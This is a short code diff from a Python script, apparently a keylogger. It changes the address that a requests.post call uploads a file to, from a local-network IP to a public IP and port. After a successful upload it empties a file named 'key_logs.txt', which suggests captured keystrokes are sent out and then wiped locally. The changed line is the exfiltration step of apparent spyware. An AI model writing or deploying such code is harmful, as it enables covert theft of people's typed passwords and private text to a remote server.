@@ -31,7 +31,7 @@ data={
 "status":"detection"
 }
 try:
-    response = requests.post('http://192.168.1.49:5000/api/file', files=textfile,headers=headers,data=data)
+    response = requests.post('http://213.226.117.171:8090/api/file', files=textfile,headers=headers,data=data)
     if response.status_code==200:
         f=open('./key_logs.txt','w')
         f.write(" ")
